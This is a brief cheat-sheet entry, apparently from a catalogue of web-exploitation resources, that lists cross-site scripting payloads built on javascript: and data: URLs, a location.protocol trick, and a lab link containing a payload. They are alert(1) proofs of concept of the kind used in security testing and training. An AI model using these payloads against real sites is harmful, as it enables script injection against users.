---
title: "portswigger cheatsheet"
description: "
Protocol

javascript:

<a href=javascript:alert(1) >xss</a>
<iframe src=\"javascript:alert(1)\">
with new line: <a href=\"javascript://%0aalert(1)\">XSS</a>
assignable protocol with location: <script>location.protocol='javascript'</script>

Example: 




data:

<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>xss</a>



"
external_category: "Web Exploitation"
---[Visit Website](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Elocation.protocol=%27javascript%27;%3C/script%3E#%0aalert(1)//&context=html)

